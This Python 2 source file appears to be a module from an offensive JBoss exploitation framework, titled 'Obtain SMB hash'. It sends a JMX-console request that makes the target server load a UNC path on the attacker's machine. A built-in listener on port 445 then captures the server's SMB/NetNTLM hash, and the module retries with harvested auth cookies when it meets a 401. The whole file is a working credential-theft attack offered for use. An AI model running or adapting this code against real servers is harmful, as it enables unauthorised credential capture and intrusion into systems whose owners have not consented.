from src.platform.jboss.authenticate import checkAuth
from src.platform.jboss.interfaces import JINTERFACES
from src.lib.cifstrap import Handler
from collections import OrderedDict
from threading import Thread
from log import LOG
from auxiliary import Auxiliary
from os import getuid
import socket
import utility


class Auxiliary:

    def __init__(self):
        self.name = 'Obtain SMB hash' 
        self.versions = ['3.0','3.2','4.0','4.2','5.0','5.1','6.0','6.1']
        self.show = True
        self.flag = 'jb-smb'
        self._Listen = False

    def check(self, fingerprint):
        if fingerprint.title in [JINTERFACES.JMX] and fingerprint.version \
                                                        in self.versions:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ This module will invoke jboss:load() with a UNC path to force the
        server to make a SMB request, thus giving up its encrypted hash with a 
        value we know (1122334455667788).

        Thanks to @cd1zz for the idea for this
        """

        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        utility.Msg("Setting up SMB listener..")

        self._Listen= True
        thread = Thread(target=self.smb_listener)
        thread.start()

        utility.Msg("Invoking UNC loader...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
        uri = '/jmx-console/HtmlAdaptor'
        data = self.getData(fingerprint.version)
        url = base + uri
        
        response = utility.requests_post(url, data=data)
        if response.status_code == 401:
            
            utility.Msg("Host %s:%s requires auth, checking..." % 
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_post(url, data=data, 
                                                cookies=cookies[0],
                                                auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" %
                            (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return

        while thread.is_alive():
            # spin...
            pass

        if response.status_code != 500:
            
            utility.Msg("Unexpected response: HTTP %d" % response.status_code, LOG.DEBUG)

        self._Listen = False

    def getData(self, version):
        """ For some reason 5.x+ double encodes characters
        Haven't figured this out yet for 7.x
        """

        if version in ["5.0", "5.1", "6.0", "6.1"]:
            return OrderedDict([
                            ('action', 'invokeOp'),
                            ('name', 'jboss%3Atype%3DService%2Cname%3DSystemProperties'),
                            ('methodIndex', 21),
                            ('arg0', "\\\\{0}\\asdf".format(utility.local_address()))
                            ])

        elif version in ["3.2", "4.0", "4.2"]:
            return OrderedDict([
                            ('action', 'invokeOp'),
                            ('name', 'jboss:type=Service,name=SystemProperties'),
                            ('methodIndex', 21),
                            ('arg0', "\\\\{0}\\asdf".format(utility.local_address()))
                            ])


    def smb_listener(self):
        """ Accept a connection and pass it off for parsing to cifstrap
        """

        try:
            handler = None
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', 445))
            sock.listen(1)

            while self._Listen:
                (con, addr) = sock.accept()
                handler = Handler(con, addr)
                handler.start()

                while handler.is_alive():
                    # spin...
                    pass

                if handler.data:
                    utility.Msg("%s" % handler.data, LOG.SUCCESS)

                break

        except Exception, e:
            utility.Msg("Socket error: %s" % e, LOG.ERROR)
        finally:
            sock.close()
